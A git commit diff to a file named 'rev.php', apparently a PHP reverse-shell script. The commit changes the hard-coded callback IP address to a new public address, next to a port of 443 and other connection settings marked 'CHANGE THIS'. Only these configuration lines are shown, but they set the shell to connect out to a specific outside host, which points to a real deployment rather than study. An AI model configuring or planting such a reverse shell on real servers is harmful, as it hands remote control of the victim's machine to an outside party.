2846b339657c090cf08d719eee0f70ac097f789f
djpon3-1 <114837524+djpon3-1@users.noreply.github.com>
2022-11-20 16:48:16 -0500

    Update rev.php

--- rev.php
+++ rev.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '38.22.104.20';  // CHANGE THIS
+$ip = '38.22.104.95';  // CHANGE THIS
 $port = 443;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
